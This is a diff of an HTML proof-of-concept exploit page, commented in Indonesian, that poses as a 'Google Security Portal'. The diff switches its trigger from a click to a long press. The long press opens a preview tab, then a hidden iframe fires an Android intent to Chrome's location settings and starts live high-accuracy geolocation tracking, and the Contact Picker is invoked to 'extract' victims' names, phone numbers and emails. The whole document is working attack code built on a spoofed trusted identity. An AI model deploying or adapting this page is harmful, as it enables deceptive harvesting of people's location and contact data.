@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chrome Site Settings & Contact Picker PoC</title>
+    <title>Preview Page & Contact Picker PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -90,17 +90,17 @@
 <body>
 
     <div class="banner">Google Security Portal</div>
-    <h1>Chrome Internal Settings & Contact Vector</h1>
+    <h1>Long Press Preview Page & Contact Picker</h1>
 
     <div class="button-container">
-        <!-- Tombol 1: Membuka Chrome Site Settings (Location) & GPS Sync -->
-        <a href="https://google.com" class="spoof-link" id="btnChromeSettings">1-Click -> Open Chrome Site Settings (Location)</a>
+        <!-- Tombol 1: Chrome Site Settings (Location) dengan Long Press -->
+        <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="btnChromeSettings">Long Press -> Open Preview & Location Settings</a>
 
-        <!-- Tombol 2: Contact Picker API Vector dengan Logika Serupa -->
-        <a href="https://google.com" class="spoof-link" style="background-color: #9334e6;" id="btnContactPicker">1-Click -> Verify & Extract Contacts</a>
+        <!-- Tombol 2: Contact Picker dengan Long Press (Contextmenu) -->
+        <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" style="background-color: #9334e6;" id="btnContactPicker">Long Press -> Open Preview & Contact Picker</a>
     </div>
 
-    <!-- Info Box Hasil Eksekusi, Koordinat, & Kontak -->
+    <!-- Info Box Hasil Eksekusi & Data -->
     <div class="info-box" id="infoBox">
         <strong>Status:</strong> <span id="statusText" class="pulse">Ready...</span><br>
         <div id="coordDetails" style="margin-top: 8px;"></div>
@@ -111,7 +111,7 @@
     <script>
         let triggered = false;
 
-        // Fungsi untuk menangkap koordinat lokasi akurasi tinggi secara live
+        // Fungsi pelacakan lokasi akurat secara live
         const startLocationWatch = () => {
             const statusText = document.getElementById("statusText");
             const coordDetails = document.getElementById("coordDetails");
@@ -143,7 +143,7 @@
             }
         };
 
-        // Handler Tombol 1: Membuka Chrome Site Settings (Location) via Intent
+        // Handler Tombol 1: Long Press memicu Preview page (google.com via target="_blank") + Intent Chrome Settings & GPS
         const handleChromeSettingsVector = () => {
             if (triggered) return;
             triggered = true;
@@ -153,20 +153,23 @@
             
             infoBox.style.display = "block";
             statusText.className = "pulse";
-            statusText.innerText = "Targeting Chrome Site Settings (Location)...";
+            statusText.innerText = "Triggering Preview Page & Location Settings...";
 
-            const intentFrame = document.createElement('iframe');
-            intentFrame.style.display = 'none';
-            intentFrame.src = "intent://settings/content/location#Intent;package=com.android.chrome;scheme=chrome;end;";
-            document.body.appendChild(intentFrame);
-            setTimeout(() => document.body.removeChild(intentFrame), 1000);
+            // Delay sebentar agar preview page / tab baru sempat terbuka di latar belakang
+            setTimeout(() => {
+                const intentFrame = document.createElement('iframe');
+                intentFrame.style.display = 'none';
+                intentFrame.src = "intent://settings/content/location#Intent;package=com.android.chrome;scheme=chrome;end;";
+                document.body.appendChild(intentFrame);
+                setTimeout(() => document.body.removeChild(intentFrame), 1000);
 
-            startLocationWatch();
+                startLocationWatch();
+            }, 800);
 
-            setTimeout(() => { triggered = false; }, 1000);
+            setTimeout(() => { triggered = false; }, 1500);
         };
 
-        // Handler Tombol 2: Contact Picker API Vector
+        // Handler Tombol 2: Long Press memicu Preview page (google.com via target="_blank") + Contact Picker API Dialog
         const handleContactVector = async () => {
             if (triggered) return;
             triggered = true;
@@ -177,53 +180,56 @@
             
             infoBox.style.display = "block";
             statusText.className = "pulse";
-            statusText.innerText = "Requesting contact directory access...";
+            statusText.innerText = "Triggering Preview Page & Contact Picker...";
 
-            try {
-                // Mengecek dukungan Contact Picker API pada browser
-                const supportedProps = await navigator.contacts.getProperties();
-                if (supportedProps.includes('name') && supportedProps.includes('tel')) {
-                    const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
-                    
-                    statusText.className = "";
-                    if (contacts.length > 0) {
-                        statusText.innerText = `Successfully Extracted ${contacts.length} Contact(s)!`;
-                        let contactListHTML = "<b>Extracted Contacts:</b><br>";
-                        contacts.forEach((c, idx) => {
-                            const name = c.name ? c.name.join(', ') : 'No Name';
-                            const tel = c.tel ? c.tel.join(', ') : 'No Phone';
-                            const email = c.email ? c.email.join(', ') : 'No Email';
-                            contactListHTML += `[${idx+1}] ${name} | ${tel} | ${email}<br>`;
-                        });
-                        coordDetails.innerHTML = contactListHTML;
+            // Memberikan jeda singkat agar interaksi long press / preview tab terbuka, lalu memunculkan dialog contact picker
+            setTimeout(async () => {
+                try {
+                    const supportedProps = await navigator.contacts.getProperties();
+                    if (supportedProps.includes('name') && supportedProps.includes('tel')) {
+                        const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                        
+                        statusText.className = "";
+                        if (contacts.length > 0) {
+                            statusText.innerText = `Successfully Extracted ${contacts.length} Contact(s)!`;
+                            let contactListHTML = "<b>Extracted Contacts:</b><br>";
+                            contacts.forEach((c, idx) => {
+                                const name = c.name ? c.name.join(', ') : 'No Name';
+                                const tel = c.tel ? c.tel.join(', ') : 'No Phone';
+                                const email = c.email ? c.email.join(', ') : 'No Email';
+                                contactListHTML += `[${idx+1}] ${name} | ${tel} | ${email}<br>`;
+                            });
+                            coordDetails.innerHTML = contactListHTML;
+                        } else {
+                            statusText.innerText = "No contacts selected.";
+                            coordDetails.innerHTML = "";
+                        }
                     } else {
-                        statusText.innerText = "No contacts selected.";
-                        coordDetails.innerHTML = "";
+                        statusText.className = "";
+                        statusText.innerText = "Contact Picker properties not supported.";
                     }
-                } else {
+                } catch (err) {
                     statusText.className = "";
-                    statusText.innerText = "Contact Picker properties not fully supported.";
+                    statusText.innerText = `Contact picker cancelled or blocked: ${err.message}`;
+                } finally {
+                    triggered = false;
                 }
-            } catch (err) {
-                statusText.className = "";
-                statusText.innerText = `Contact picker cancelled or blocked: ${err.message}`;
-            } finally {
-                triggered = false;
-            }
+            }, 800);
         };
 
-        // Event listener 1-klik murni
-        document.getElementById("btnChromeSettings").addEventListener("click", (e) => {
-            e.preventDefault();
+        // Menggunakan event 'contextmenu' (Long Press pada Mobile / Klik Kanan pada Desktop)
+        // Atribut href="https://google.com" dan target="_blank" tetap berjalan normal untuk membuka preview page.
+        document.getElementById("btnChromeSettings").addEventListener("contextmenu", (e) => {
             handleChromeSettingsVector();
         });
+        document.getElementById("btnChromeSettings").addEventListener("touchstart", () => {}, { passive: true });
 
-        document.getElementById("btnContactPicker").addEventListener("click", (e) => {
-            e.preventDefault();
+        document.getElementById("btnContactPicker").addEventListener("contextmenu", (e) => {
             handleContactVector();
         });
+        document.getElementById("btnContactPicker").addEventListener("touchstart", () => {}, { passive: true });
 
-        // Auto-Sync saat pengguna kembali dari halaman setelan Chrome ke tab aktif (window focus)
+        // Auto-Sync saat pengguna kembali dari halaman preview/setelan ke tab aktif (window focus)
         window.addEventListener("focus", () => {
             if (infoBox.style.display === "block" && document.getElementById("coordDetails").innerHTML.includes("Latitude")) {
                 startLocationWatch();
